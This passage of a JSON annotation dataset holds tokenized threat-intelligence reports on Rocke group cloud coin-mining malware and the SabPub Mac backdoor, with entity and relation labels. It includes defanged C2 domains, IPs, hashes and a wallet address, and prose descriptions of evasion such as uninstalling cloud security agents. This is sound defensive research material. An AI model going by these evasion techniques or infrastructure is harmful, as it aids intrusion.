"our", "products"], ["and", "services", "stop", "threats", "where", "they", "emerge\u2014from", "the", "Internet", ".", "They", "are"], ["supported", "by", "1", ",", "000+", "threat", "intelligence", "experts", "around", "the", "globe", "."], ["TREND", "MICRO", "INC", "."], ["10101", "N", ".", "De", "Anza", "Blvd", "."], ["Cupertino", ",", "CA", "95014"], ["U", ".", "S.", "toll", "free:", "1", "+800", ".", "228.5651"], ["Phone:", "1", "+408", ".", "257.1500"], ["Fax:", "1", "+408", ".", "257.2003"], ["www", ".", "trendmicro.com"]]}], [{"vertexSet": [{"old_id": "T1", "type": "AttackerGroup", "name": "Iron cybercrime", "sent_id": 6, "pos": [13, 14]}, {"old_id": "T2", "type": "Malware", "name": "Xbash", "sent_id": 7, "pos": [1]}, {"old_id": "T3", "type": "Organization", "name": "Palo Alto Networks", "sent_id": 5, "pos": [0, 2]}, {"old_id": "T4", "type": "Action", "name": "coin mining", "sent_id": 5, "pos": [14, 15]}, {"old_id": "T5", "type": "System", "name": "Linux", "sent_id": 5, "pos": [13]}, {"old_id": "T6", "type": "Organization", "name": "Talos", "sent_id": 7, "pos": [19]}, {"old_id": "T7", "type": "AttackerGroup", "name": "Rocke", "sent_id": 7, "pos": [14]}, {"old_id": "T8", "type": "Attacker", "name": "Rocke group", "sent_id": 11, "pos": [12, 13]}, {"old_id": "T9", "type": "ModificationAction", "name": "uninstall", "sent_id": 11, "pos": [18]}, {"old_id": "T10", "type": "ExploitTargetObject", "name": "cloud security protection", "sent_id": 12, "pos": [1, 3]}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "full administrative contro", "sent_id": 13, "pos": []}, {"old_id": "T12", "type": "Organization", "name": "Tencent Cloud", "sent_id": 16, "pos": [5, 6]}, {"old_id": "T13", "type": "Organization", "name": "Alibaba Cloud", "sent_id": 16, "pos": [8, 6]}, {"old_id": "T14", "type": "Location", "name": "China", "sent_id": 16, "pos": [18]}, {"old_id": "T15", "type": "Exploit", "name": "Coin Miner", "sent_id": 21, "pos": [1, 2]}, {"old_id": "T16", "type": "AttackerGroup", "name": "Rocke Group", "sent_id": 21, "pos": [5, 6]}, {"old_id": "T17", "type": "Organization", "name": "Cisco Talos", "sent_id": 22, "pos": [8, 9]}, {"old_id": "T18", "type": "Attacker", "name": "Rocke", "sent_id": 22, "pos": [3]}, {"old_id": "T19", "type": "ExploitTargetObject", "name": "Monero cryptocurrency", "sent_id": 23, "pos": [0, 1]}, {"old_id": "T20", "type": "Vulnerability", "name": "CVE-2017-10271", "sent_id": 25, "pos": [14]}, {"old_id": "T21", "type": "Software", "name": "Oracle WebLogic", "sent_id": 25, "pos": [11, 0]}, {"old_id": "T22", "type": "File", "name": "0720bin", "sent_id": 26, "pos": []}, {"old_id": "T23", "type": "Host", "name": "Linux", "sent_id": 25, "pos": [16]}, {"old_id": "T24", "type": "AttackerGroup", "name": "Rocke group", "sent_id": 24, "pos": [10, 11]}, {"old_id": "T25", "type": "Software", "name": "Apache Struts 2", "sent_id": 24, "pos": [15, 17]}, {"old_id": "T26", "type": "Software", "name": "WebLogic", "sent_id": 25, "pos": [0]}, {"old_id": "T27", "type": "Software", "name": "Adobe ColdFusion", "sent_id": 25, "pos": [3, 4]}, {"old_id": "T28", "type": "AttackerGroup", "name": "Rocke group", "sent_id": 56, "pos": [0, 1]}, {"old_id": "T29", "type": "Action", "name": "uninstalls cloud security products", "sent_id": 57, "pos": [5, 8]}, {"old_id": "T30", "type": "Organization", "name": "Alibaba Cloud", "sent_id": 57, "pos": [10, 11]}, {"old_id": "T31", "type": "Organization", "name": "Tencent Cloud", "sent_id": 57, "pos": [13, 11]}, {"old_id": "T32", "type": "ExploitTargetObject", "name": "Tencent Cloud Monitor", "sent_id": 58, "pos": [16, 18]}, {"old_id": "T33", "type": "Attacker", "name": "Rocke", "sent_id": 58, "pos": [9]}, {"old_id": "T34", "type": "ExploitTargetObject", "name": "Tencent Cloud Monitor process", "sent_id": 60, "pos": [5, 8]}, {"old_id": "T35", "type": "Organization", "name": "Alibaba Cloud", "sent_id": 63, "pos": [4, 2]}, {"old_id": "T36", "type": "Organization", "name": "Tencent Cloud", "sent_id": 63, "pos": [1, 2]}, {"old_id": "T37", "type": "ExploitTargetObject", "name": "Alibaba Threat Detection Service", "sent_id": 64, "pos": [8, 11]}, {"old_id": "T38", "type": "Software", "name": "Tencent Cloud Host Security", "sent_id": 68, "pos": [7, 10]}, {"old_id": "T39", "type": "Attacker", "name": "Rocke group", "sent_id": 69, "pos": [5, 6]}, {"old_id": "T40", "type": "Organization", "name": "Alibaba Cloud", "sent_id": 69, "pos": [13, 14]}, {"old_id": "T41", "type": "Organization", "name": "Tencent", "sent_id": 69, "pos": [16]}, {"old_id": "T42", "type": "Software", "name": "Alibaba Threat Detection Service", "sent_id": 73, "pos": [2, 5]}, {"old_id": "T43", "type": "Software", "name": "Alibaba CloudMonitor agent", "sent_id": 74, "pos": [2, 4]}, {"old_id": "T44", "type": "Software", "name": "Alibaba Cloud Assistant agent", "sent_id": 75, "pos": [2, 5]}, {"old_id": "T45", "type": "Software", "name": "Tencent Host Security agent", "sent_id": 77, "pos": [2, 5]}, {"old_id": "T46", "type": "Software", "name": "Tencent Cloud Monitor agent", "sent_id": 78, "pos": [2, 5]}, {"old_id": "T47", "type": "Attacker", "name": "Rocke group", "sent_id": 79, "pos": [15, 16]}, {"old_id": "T48", "type": "ExploitTargetObject", "name": "public cloud infrastructure", "sent_id": 81, "pos": [0, 2]}, {"old_id": "T49", "type": "Organization", "name": "Palo Alto Networks", "sent_id": 83, "pos": [0, 2]}, {"old_id": "T50", "type": "Organization", "name": "Tencent Cloud", "sent_id": 83, "pos": [9, 10]}, {"old_id": "T51", "type": "Organization", "name": "Alibaba Cloud", "sent_id": 83, "pos": [12, 10]}, {"old_id": "T52", "type": "ExploitTargetObject", "name": "Public cloud infrastructure", "sent_id": 87, "pos": [0, 2]}, {"old_id": "T53", "type": "Attacker", "name": "Rocke group", "sent_id": 90, "pos": [8, 9]}, {"old_id": "T54", "type": "ExploitTargetObject", "name": "public cloud infrastructure", "sent_id": 91, "pos": [12, 14]}], "labels": [{"old_id": "R1", "r": "P3", "h": 1, "t": 0, "evidence": []}, {"old_id": "R2", "r": "P3", "h": 1, "t": 6, "evidence": [7]}, {"old_id": "R3", "r": "P27", "h": 7, "t": 9, "evidence": [11, 12]}, {"old_id": "R4", "r": "P27", "h": 7, "t": 10, "evidence": [11, 12, 13]}, {"old_id": "R5", "r": "P27", "h": 17, "t": 18, "evidence": [22, 23]}, {"old_id": "R6", "r": "P19", "h": 20, "t": 19, "evidence": [25]}, {"old_id": "R7", "r": "P25", "h": 22, "t": 20, "evidence": [25]}, {"old_id": "R8", "r": "P27", "h": 32, "t": 31, "evidence": [58]}, {"old_id": "R9", "r": "P27", "h": 32, "t": 33, "evidence": [58, 59, 60]}, {"old_id": "R10", "r": "P27", "h": 38, "t": 36, "evidence": []}, {"old_id": "R11", "r": "P17", "h": 40, "t": 37, "evidence": []}, {"old_id": "R12", "r": "P17", "h": 35, "t": 37, "evidence": [63, 64, 65, 66, 67, 68]}, {"old_id": "R13", "r": "P17", "h": 39, "t": 41, "evidence": [69, 70, 71, 72, 73]}, {"old_id": "R14", "r": "P17", "h": 39, "t": 42, "evidence": [69, 70, 71, 72, 73, 74]}, {"old_id": "R15", "r": "P17", "h": 39, "t": 43, "evidence": [69, 70, 71, 72, 73, 74, 75]}, {"old_id": "R16", "r": "P17", "h": 40, "t": 44, "evidence": [69, 70, 71, 72, 73, 74, 75, 76, 77]}, {"old_id": "R17", "r": "P17", "h": 40, "t": 45, "evidence": [69, 70, 71, 72, 73, 74, 75, 76, 77, 78]}, {"old_id": "R18", "r": "P27", "h": 46, "t": 47, "evidence": [79, 80, 81]}, {"old_id": "R19", "r": "P27", "h": 46, "t": 51, "evidence": [79, 80, 81, 82, 83, 84, 85, 86, 87]}, {"old_id": "R20", "r": "P27", "h": 52, "t": 53, "evidence": [90, 91]}, {"old_id": "R21", "r": "P17", "h": 49, "t": 45, "evidence": []}], "title": ["inputs/txt/201901RockeGroupXbash"], "sents": [["Malware", "Used", "by", "\u201cRocke\u201d", "Group", "Evolves", "to", "Evade", "Detection", "by", "Cloud"], ["Security", "Products"], ["unit42", ".", "paloaltonetworks.com/malware-used-by-rocke-group-evolves-to-evade-detection-by-cloud-security-products/"], ["By", "Xingyu", "Jin", "and", "Claud", "Xiao"], ["January", "17", ",", "2019"], ["Palo", "Alto", "Networks", "Unit", "42", "recently", "captured", "and", "investigated", "new", "samples", "of", "the", "Linux", "coin", "mining", "malware", "used", "by"], ["the", "Rocke", "group", ".", "The", "family", "was", "suspected", "to", "be", "developed", "by", "the", "Iron", "cybercrime", "group", "and", "it\u2019s", "also", "associated", "with"], ["the", "Xbash", "malware", "we", "reported", "on", "in", "September", "of", "2018", ".", "The", "threat", "actor", "Rocke", "was", "originally", "revealed", "by", "Talos", "in"], ["August", "of", "2018", "and", "many", "remarkable", "behaviors", "were", "disclosed", "in", "their", "blog", "post", ".", "The", "samples", "described", "in", "this", "report"], ["were", "collected", "in", "October", "of", "2018", ",", "and", "since", "that", "time", "the", "command", "and", "control", "servers", "they", "use", "have", "been", "shut"], ["down", "."], ["During", "our", "analysis", ",", "we", "realized", "that", "these", "samples", "used", "by", "the", "Rocke", "group", "adopted", "new", "code", "to", "uninstall", "five"], ["different", "cloud", "security", "protection", "and", "monitoring", "products", "from", "compromised", "Linux", "servers", ".", "In", "our", "analysis", ",", "these"], ["attacks", "did", "not", "compromise", "these", "security", "products:", "rather", ",", "the", "attacks", "first", "gained", "full", "administrative", "control", "over", "the"], ["hosts", "and", "then", "abused", "that", "full", "administrative", "control", "to", "uninstall", "these", "products", "in", "the", "same", "way", "a", "legitimate"], ["administrator", "would", "."], ["These", "products", "were", "developed", "by", "Tencent", "Cloud", "and", "Alibaba", "Cloud", "(Aliyun)", ",", "the", "two", "leading", "cloud", "providers", "in", "China"], ["that", "are", "expanding", "their", "business", "globally", ".", "To", "the", "best", "of", "our", "knowledge", ",", "this", "is", "the", "first", "malware", "family", "that", "developed"], ["the", "unique", "capability", "to", "target", "and", "remove", "cloud", "security", "products", ".", "This", "also", "highlights", "a", "new", "challenge", "for", "products"], ["in", "the", "Cloud", "Workload", "Protection", "Platforms", "market", "defined", "by", "Gartner", "."], ["Technical", "Details"], ["The", "Coin", "Miner", "used", "by", "Rocke", "Group"], ["The", "threat", "actor", "Rocke", "was", "first", "reported", "by", "Cisco", "Talos", "in", "late", "July", "2018", ".", "The", "ultimate", "goal", "of", "this", "threat", "is", "to", "mine"], ["Monero", "cryptocurrency", "in", "compromised", "Linux", "machines", "."], ["To", "deliver", "the", "malware", "to", "the", "victim", "machines", ",", "the", "Rocke", "group", "exploits", "vulnerabilities", "in", "Apache", "Struts", "2", ",", "Oracle"], ["WebLogic", ",", "and", "Adobe", "ColdFusion", ".", "For", "example", ",", "by", "exploiting", "Oracle", "WebLogic", "vulnerability", "CVE-2017-10271", "in", "Linux"], ["shown", "in", "Figure", "1", ",", "a", "compromised", "Linux", "victim", "machine", "downloads", "backdoor", "0720", ".", "bin", "and", "opens", "a", "shell", "."], ["Figure", "1", ".", "Exploit", "CVE-2017-10271"], ["Once", "the", "C2", "connection", "is", "established", ",", "malware", "used", "by", "the", "Rocke", "group", "downloads", "shell", "script", "named", "as", "\u201ca7\u201d", "to", "the"], ["victim", "machine", ".", "The", "behaviors", "of", "a7", "include:"], ["Achieve", "persistence", "through", "cronjobs"], ["Kill", "other", "crypto", "mining", "processes"], ["1/6"], ["Add", "iptables", "rules", "to", "block", "other", "crypto", "mining", "malware"], ["Uninstall", "agent-based", "cloud", "security", "products"], ["Download", "and", "run", "UPX", "packed", "coin", "miner", "from", "blog[", ".", "]sydwzl[.]cn"], ["Hide", "process", "from", "Linux", "ps", "command", "by", "using", "the", "open", "source", "tool", "\u201clibprocesshider\u201d", "with", "LD_PRELOAD", "trick"], ["Adjust", "malicious", "file", "date", "time"], ["Cloud", "Workload", "Protection", "Platforms"], ["According", "to", "Gartner", ",", "Cloud", "Workload", "Protection", "Platforms", "(CWPPs)", "are", "the", "agent-based", "workload-centric", "security"], ["protection", "solutions", ".", "To", "mitigate", "the", "impact", "of", "malware", "intrusion", "in", "public", "cloud", "infrastructure", ",", "cloud", "service", "providers"], ["develop", "their", "own", "CWPPs", "as", "the", "server", "security", "operation", "and", "management", "products", "."], ["For", "example", ",", "Tencent", "Cloud", "offers", "Tencent", "Host", "Security", "(HS", ",", "aka", "YunJing\u4e91\u955c)", "with", "various", "security", "protection"], ["services", ".", "According", "to", "its", "\u201cProduct", "Overview\u201d", "document", ",", "Tencent", "Host", "Security", "provides", "key", "security", "features", "like"], ["trojan", "detection", "and", "removal", "based", "on", "machine", "learning", ",", "password", "cracking", "alert", ",", "logging", "activity", "audit", ",", "vulnerability"], ["management", ",", "and", "asset", "management", "as", "shown", "in", "Figure", "2", "."], ["Figure", "2", ".", "Tencent", "Host", "Security", "Key", "Features"], ["Alibaba", "Cloud", "(Aliyun)", "also", "offers", "a", "cloud", "security", "product", "called", "Threat", "Detection", "Service", "(TDS", ",", "aka", "Aegis", "\u5b89\u9a91\u58eb)", "."], ["Alibaba", "Cloud", "Threat", "Detection", "Service", "provides", "security", "services", "like", "malware", "scanning", "and", "removal", ",", "vulnerability"], ["management", ",", "log", "analysis", ",", "and", "threat", "analysis", "based", "on", "big", "data", "."], ["Third-party", "cybersecurity", "companies", "also", "provide", "CWPPs", ".", "For", "instance", ",", "Trend", "Micro", ",", "Symantec", ",", "and", "Microsoft", "have"], ["their", "own", "cloud", "security", "products", "for", "public", "cloud", "infrastructure", ".", "As", "with", "all", "security", "products", ",", "adversaries", "inevitably"], ["work", "to", "evade", "these", "systems", "to", "be", "able", "to", "achieve", "their", "ultimate", "goals", "."], ["Evading", "Detection", "from", "Cloud", "Workload", "Protection", "Platforms"], ["2/6"], ["In", "response", "to", "agent-based", "Cloud", "Workload", "Protection", "Platforms", "from", "cloud", "service", "providers", ",", "malware", "used", "by", "the"], ["Rocke", "group", "gradually", "developed", "the", "capability", "to", "evade", "detection", "before", "exhibiting", "any", "malicious", "behaviors", ".", "To", "be"], ["more", "specific", ",", "the", "malware", "uninstalls", "cloud", "security", "products", "by", "Alibaba", "Cloud", "and", "Tencent", "Cloud", "."], ["In", "the", "early", "version", "of", "the", "malware", "used", "by", "Rocke", ",", "it", "only", "attempts", "to", "kill", "Tencent", "Cloud", "Monitor", "process", "as", "shown", "in"], ["Figure", "3", "."], ["Figure", "3", ".", "Malware", "kills", "Tencent", "Cloud", "Monitor", "process"], ["Realizing", "that", "killing", "the", "cloud", "monitor", "service", "alone", "is", "not", "enough", "to", "evade", "detection", "by", "agent-based", "cloud", "security"], ["products", ",", "the", "malware", "authors", "continued", "developing", "more", "effective", "methods", "to", "evade", "detection", "by", "killing", "more", "agentbased", "cloud", "security", "services", "."], ["The", "Tencent", "Cloud", "and", "Alibaba", "Cloud", "official", "websites", "provide", "documents", "to", "guide", "users", "about", "how", "to", "uninstall", "their"], ["cloud", "security", "products", ".", "The", "document", "for", "uninstalling", "Alibaba", "Threat", "Detection", "Service", "is", "shown", "in", "Figure", "4", "."], ["Figure", "4", ".", "Official", "guide", "for", "uninstalling", "Alibaba", "Threat", "Detection", "Service"], ["The", "document", "for", "uninstalling", "Tencent", "Cloud", "Host", "Security", "is", "shown", "in", "Figure", "5", "."], ["3/6"], ["Figure", "5", ".", "Official", "guide", "for", "uninstalling", "Tencent", "Cloud", "Host", "Security", "Product"], ["The", "malware", "used", "by", "the", "Rocke", "group", "follows", "the", "uninstallation", "procedure", "provided", "by", "Alibaba", "Cloud", "and", "Tencent"], ["Cloud", "as", "well", "as", "some", "random", "blog", "posts", "on", "the", "Internet", ".", "The", "key", "uninstall", "function", "is", "shown", "in", "Figure", "6", "."], ["Figure", "6", ".", "Key", "function", "for", "malware", "to", "evade", "detection"], ["This", "function", "can", "uninstall:"], ["1", ".", "Alibaba", "Threat", "Detection", "Service", "agent", "."], ["2", ".", "Alibaba", "CloudMonitor", "agent", "(Monitor", "CPU", "&", "memory", "consumption", ",", "network", "connectivity)", "."], ["3", ".", "Alibaba", "Cloud", "Assistant", "agent", "(tool", "for", "automatically", "managing", "instances)", "."], ["4/6"], ["4", ".", "Tencent", "Host", "Security", "agent", "."], ["5", ".", "Tencent", "Cloud", "Monitor", "agent", "."], ["After", "agent-based", "cloud", "security", "and", "monitor", "products", "are", "uninstalled", ",", "the", "malware", "used", "by", "the", "Rocke", "group", "begins", "to"], ["exhibit", "malicious", "behaviors", ".", "We", "believe", "this", "unique", "evasion", "behavior", "will", "be", "the", "new", "trend", "for", "malware", "which", "targets"], ["public", "cloud", "infrastructure", "."], ["Mitigations"], ["Palo", "Alto", "Networks", "Unit", "42", "has", "been", "cooperating", "with", "Tencent", "Cloud", "and", "Alibaba", "Cloud", "to", "address", "the", "malware"], ["evasion", "problem", "and", "its", "C2", "infrastructure", ".", "Additionally", ",", "the", "malicious", "C2", "domains", "are", "identified", "by", "our", "PAN-DB", "URL"], ["Filtering", "."], ["Conclusion"], ["Public", "cloud", "infrastructure", "is", "one", "of", "the", "main", "targets", "for", "this", "cybercrime", "group", ".", "Realizing", "the", "existing", "cloud", "monitor"], ["and", "security", "products", "may", "detect", "the", "possible", "malware", "intrusion", ",", "malware", "authors", "continue", "to", "create", "new", "evasion"], ["technologies", "to", "avoid", "being", "detected", "by", "cloud", "security", "product", "."], ["The", "variant", "of", "the", "malware", "used", "by", "the", "Rocke", "group", "is", "an", "example", "that", "demonstrates", "that", "the", "agent-based", "cloud"], ["security", "solution", "may", "not", "be", "enough", "to", "prevent", "evasive", "malware", "targeted", "at", "public", "cloud", "infrastructure", "."], ["Indicators", "of", "Compromise"], ["Samples", "with", "the", "evasion", "behavior"], ["2e3e8f980fde5757248e1c72ab8857eb2aea9ef4a37517261a1b013e3dc9e3c4"], ["2f603054dda69c2ac1e49c916ea4a4b1ae6961ec3c01d65f16929d445a564355"], ["28ea5d2e44538cd7fec11a28cce7c86fe208b2e8f53d57bf8a18957adb90c5ab"], ["232c771f38da79d5b8f7c6c57ddb4f7a8d6d44f8bca41be4407ed4923096c700"], ["893bdc6b7d2d7134b1ceb5445dbb97ad9c731a427490d59f6858a835525d8417"], ["9300f1aa56a73887d05672bfb9862bd786230142c949732c208e5e019d14f83a"], ["27611b92d31289d023d962d3eb7c6abd194dbdbbe4e6977c42d94883553841e8"], ["d341e3a9133e534ca35d5ccc54b8a79f93ff0c917790e7d5f73fedaa480a6b93"], ["ed038e9ea922af9f0bf5e8be42b394650fa808982d5d555e6c50c715ff2cca0c"], ["4b74c4d66387c70658238ac5ab392e2fe5557f98fe09eadda9259ada0d87c0f1"], ["e391963f496ba056e9a9f750cbd28ca7a08ac4cfc434bee4fc57a292b11941e6"], ["017dee32e287f37a82cf6e249f8a85b5c9d4f090e5452118ccacaf147e88dc66"], ["Domains", "for", "C2", "Communication"], ["dwn[", ".", "]rundll32[.]ml"], ["www[", ".", "]aybc[.]so"], ["a[", ".", "]ssvs[.]space"], ["sydwzl[", ".", "]cn"], ["IPs", "for", "C2", "Communication"], ["118", ".", "24.150[.]172", "(on", "Tencent", "Cloud)"], ["120", ".", "55.54[.]65", "(on", "Alibaba", "Cloud)"], ["URLs", "for", "Code", "Update"], ["5/6"], ["hxxps://pastebin[", ".", "]com/raw/CnPtQ2tM"], ["hxxps://pastebin[", ".", "]com/raw/rjPGgXQE"], ["hxxps://pastebin[", ".", "]com/raw/1NtRkBc3"], ["hxxps://pastebin[", ".", "]com/raw/tRxfvbYN"], ["hxxps://pastebin[", ".", "]com/raw/SSCy7mY7"], ["hxxps://pastebin[", ".", "]com/raw/VVt27LeH"], ["hxxps://pastebin[", ".", "]com/raw/Fj2YdETv"], ["hxxps://pastebin[", ".", "]com/raw/JNPewK6r"], ["hxxps://pastebin[", ".", "]com/raw/TzBeq3AM"], ["hxxps://pastebin[", ".", "]com/raw/eRkrSQfE"], ["hxxps://pastebin[", ".", "]com/raw/5bjpjvLP"], ["hxxps://pastebin[", ".", "]com/raw/Gw7mywhC"], ["XMR", "Wallet", "Address"], ["42im1KxfTw2Sxa716eKkQAcJpS6cwqkGaHHGnnUAcdDhG2NJhqEF1nNRwjkBsYDJQtDkLCTPehfDC4zjMy5hefT81Xk2h7V", ".", "v7"], ["6/6"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Attacker", "name": "LuckyCat", "sent_id": 2, "pos": [3]}, {"old_id": "T2", "type": "Address", "name": "199192152*", "sent_id": 2, "pos": []}, {"old_id": "T3", "type": "Time", "name": "Friday Apri 13", "sent_id": 8, "pos": [1, 3]}, {"old_id": "T4", "type": "Malware", "name": "SabPub", "sent_id": 18, "pos": [4]}, {"old_id": "T5", "type": "Indicator", "name": "e3SCNUA2Om97ZXJ1fGI+Y4Bt", "sent_id": 24, "pos": []}, {"old_id": "T6", "type": "Indicator", "name": "OjlDLjw5Pi4+NUAuQDBA", "sent_id": 25, "pos": []}, {"old_id": "T7", "type": "Malware", "name": "SabPub", "sent_id": 22, "pos": [2]}, {"old_id": "T8", "type": "Dropper", "name": "ExploitMSWordCVE-2009-0563a", "sent_id": 29, "pos": []}, {"old_id": "T9", "type": "Malware", "name": "MaControl", "sent_id": 30, "pos": [14]}, {"old_id": "T10", "type": "File", "name": "8958doc", "sent_id": 33, "pos": []}, {"old_id": "T11", "type": "MD5", "name": "40C8786A4887A763D8F3E5243724D1C9", "sent_id": 35, "pos": []}, {"old_id": "T12", "type": "File", "name": "10th March Statemnet", "sent_id": 37, "pos": []}, {"old_id": "T13", "type": "Malware", "name": "SabPub", "sent_id": 31, "pos": [1]}, {"old_id": "T14", "type": "Software", "name": "VirusTotal", "sent_id": 39, "pos": [4]}, {"old_id": "T15", "type": "Exploit", "name": "spearphishing emails", "sent_id": 48, "pos": [17, 18]}, {"old_id": "T16", "type": "Exploit", "name": "Java exploits", "sent_id": 52, "pos": [14, 15]}, {"old_id": "T17", "type": "ExploitTargetObject", "name": "Mac OS X", "sent_id": 53, "pos": [1, 3]}, {"old_id": "T18", "type": "Time", "name": "February 2012", "sent_id": 58, "pos": [15, 16]}, {"old_id": "T19", "type": "Attacker", "name": "SabPub", "sent_id": 57, "pos": [7]}, {"old_id": "T20", "type": "Vulnerability", "name": "CVE-2009-0563", "sent_id": 59, "pos": [12]}, {"old_id": "T21", "type": "Software", "name": "Word", "sent_id": 59, "pos": [7]}], "labels": [{"old_id": "R1", "r": "P33", "h": 0, "t": 2, "evidence": [2, 3, 4, 5, 6, 7, 8]}, {"old_id": "R2", "r": "P21", "h": 4, "t": 6, "evidence": []}, {"old_id": "R3", "r": "P21", "h": 5, "t": 6, "evidence": []}, {"old_id": "R4", "r": "P21", "h": 9, "t": 12, "evidence": []}, {"old_id": "R5", "r": "P21", "h": 10, "t": 12, "evidence": []}, {"old_id": "R6", "r": "P33", "h": 18, "t": 17, "evidence": [57, 58]}, {"old_id": "R7", "r": "P19", "h": 20, "t": 19, "evidence": [59]}], "title": ["inputs/txt/201204SecureListSabPub"], "sents": [["New", "Version", "of", "OSX", ".", "SabPub", "&", "Confirmed", "Mac", "APT", "attacks"], ["Late", "last", "week", ",", "we", "found", "evidence", "of", "a", "possible", "link", "between", "a", "Mac", "OS", "X", "backdoor", "trojan", "and", "an", "APT"], ["attack", "known", "as", "LuckyCat", ".", "The", "IP", "address", "of", "the", "C&C", "to", "which", "this", "bot", "connects", "(199", ".", "192.152.*)", "was", "also"], ["used", "in", "other", "Windows", "malware", "samples", "during", "2011", ",", "which", "made", "us", "believe", "we", "were", "looking", "at", "the", "same"], ["entity", "behind", "these", "attacks", "."], ["For", "the", "past", "two", "days", ",", "we", "have", "been", "monitoring", "a", "\u201cfake\u201d", "infected", "system", "-", "which", "is", "a", "typical", "procedure", "we"], ["do", "for", "APT", "bots", ".", "We", "were", "extremely", "surprised", "when", "during", "the", "weekend", ",", "the", "APT", "controllers", "took", "over"], ["our", "\u201cgoat\u201d", "infected", "machine", "and", "started", "exploring", "it", "."], ["On", "Friday", "Apri", "13", ",", "port", "80", "on", "the", "C&C", "server", "located", "at", "rt*****", ".", "onedumb.com", "and", "hosted", "on", "a", "VPS", "in"], ["Fremont", ",", "U", ".", "S.", "was", "closed", ".", "Saturday", ",", "the", "port", "was", "opened", "and", "bot", "started", "communicating", "with", "the", "C&C"], ["server", ".", "For", "the", "entire", "day", ",", "the", "traffic", "was", "just", "basic", "handshakes", "and", "exchanges", ",", "nothing", "more", "."], ["On", "the", "morning", "of", "Sunday", "April", "15", ",", "the", "traffic", "generated", "by", "the", "C&C", "changed", ".", "The", "attackers", "took", "over", "the"], ["connection", "and", "started", "analysing", "our", "fake", "victim", "machine", ".", "They", "listed", "the", "contents", "of", "the", "root", "and", "home"], ["folders", "and", "even", "stole", "some", "of", "the", "goat", "documents", "we", "put", "in", "there", "!"], ["Encoded", "communication", "between", "C&C", "and", "our", "fake", "victim"], ["Packet", "above", ",", "decoded", "-", "attacker", "is", "listing", "folders", "content"], ["We", "are", "pretty", "confident", "the", "operation", "of", "the", "bot", "was", "done", "manually", "--", "which", "means", "a", "real", "attacker", ",", "who"], ["manually", "checks", "the", "infected", "machines", "and", "extracts", "data", "from", "them", "."], ["We", "can", "therefore", "confirm", "SabPub", "as", "APT", "in", "active", "stage", "."], ["On", "Sunday", "midday", ",", "the", "C&C", "domain", "was", "shutdown", "and", "the", "bot", "lost", "connection", "to", "it;", "this", "appears", "to", "be", "an"], ["initiative", "from", "the", "free", "DNS", "service", "onedumb", ".", "com", "and", "it", "was", "no", "doubt", "triggered", "by", "the", "media", "attention", "."], ["Interestingly", ",", "the", "VPS", "used", "as", "the", "C&C", "is", "still", "active", "."], ["While", "analysing", "SabPub", ",", "we", "discovered", "another", "version", "of", "the", "backdoor", "which", "seems", "to", "have", "been", "created"], ["earlier", ".", "This", "version", "differs", "from", "the", "original", "one", "only", "slightly", "--", "the", "hardcoded", "C&C", "address", "is", "different", "-instead", "of", "the", "onedumb", ".", "com", "subdomain", "used", "by", "the", "original", "sample", "(hardcoded", "in", "the", "bot", "as"], ["\u201ce3SCNUA2Om97ZXJ1fGI+Y4Bt\u201d)", ",", "this", "one", "simply", "contains", "the", "IP", "address", "of", "the", "VPS", "(hardcoded", "as"], ["\u201cOjlDLjw5Pi4+NUAuQDBA\u201d)", ",", "meaning", ",", "it", "should", "still", "be", "operational", ".", "Its", "size", "is", "42556", "bytes", "vs", "42580"], ["for", "the", "original", "one", "."], ["One", "of", "the", "biggest", "mysteries", "is", "the", "infection", "vector", "of", "these", "attacks", ".", "Given", "the", "highly", "targeted", "nature", "of", "the"], ["attack", ",", "there", "are", "very", "few", "traces", ".", "Nevertheless", ",", "we", "found", "an", "important", "detail", "which", "is", "the", "missing", "link:", "Six"], ["Microsoft", "Word", "documents", ",", "which", "we", "detect", "as", "Exploit", ".", "MSWord.CVE-2009-0563.a.", "In", "total", "we", "have"], ["six", "relevant", "Word", "", ".", "docs", "with", "this", "verdict", "--", "with", "four", "dropping", "the", "MaControl", "bot", ".", "The", "remaining", "two"], ["drop", "SabPub", "."], ["The", "most", "interesting", "thing", "here", "is", "the", "history", "of", "the", "second", "SabPub", "variant", ".", "In", "our", "virus", "collection", ",", "it", "is"], ["named", "\u201c8958", ".", "doc\u201d.", "This", "suggests", "iit", "was", "extracted", "from", "a", "Word", "document", "or", "was", "distributed", "as", "a", "Doc-file", "."], ["We", "performed", "an", "analysis", "of", "the", "same", "and", "traced", "its", "origin", "by", "the", "MD5"], ["(40C8786A4887A763D8F3E5243724D1C9)", ".", "The", "results", "were", "fascinating:"], ["-", "The", "sample", "was", "uploaded", "to", "VirusTotal", "on", "February", "25", ",", "2012", "\u2013", "from", "two", "sources", "in", "the", "U", ".", "S."], ["-", "In", "both", "cases", ",", "the", "original", "file", "name", "was", "\u201c10th", "March", "Statemnet\u201d", "(yes", ",", "with", "the", "typo", "and", "without"], ["extension)"], ["-", "Zero", "detections", "on", "VirusTotal", "at", "that", "time", "(0/40)"], ["In", "case", "you", "are", "wondering", ",", "the", "name", "of", "the", "file", "(\u201c10th", "March", "Statemnet\u201d)", "is", "directly", "linked", "with", "the", "DalaiLama", "and", "Tibetan", "community", ".", "On", "March", "10", ",", "2011", ",", "the", "Dalai-Lama", "released", "a", "special", "statement", "related", "to"], ["Anniversary", "of", "the", "Tibetan", "People\u2019s", "National", "Uprising", "Day", "--", "hence", "the", "name", "."], ["Properties", "field", "of", "a", "document", "used", "to", "spread", "SabPub"], ["Unfortunately", "there", "is", "little", "information", "in", "the", "doc", "files", ",", "but", "the", "Author", "field", "and", "the", "creation", "date", "are"], ["interesting", ".", "In", "particular", ",", "if", "we", "trust", "the", "creation", "date", ",", "this", "means", "the", "container", "DOC", "was", "created", "in"], ["August", "2010", "and", "it", "was", "updated", "in", "2012", "with", "the", "SabPub", "sample", ".", "This", "is", "quite", "normal", "for", "such", "attacks"], ["and", "we", "have", "seen", "it", "in", "other", "cases", ",", "for", "instance", ",", "Duqu", "."], ["We", "think", "the", "above", "facts", "show", "a", "direct", "connection", "between", "the", "SabPub", "and", "Luckycat", "APT", "attacks", ".", "We", "are"], ["pretty", "sure", "the", "SabPub", "backdoor", "was", "created", "as", "far", "back", "as", "February", "2012", "and", "was", "distributed", "via", "spearphishing", "emails", "."], ["It", "is", "also", "important", "to", "point", "that", "SabPub", "isn\u2019t", "backdoor", "MaControl", "(the", "case", "was", "described", "here)", "but", "still"], ["uses", "the", "same", "topics", "to", "trick", "victims", "into", "opening", "it", ".", "SabPub", "was", "the", "more", "effective", "attack", "because", "it"], ["remained", "undetected", 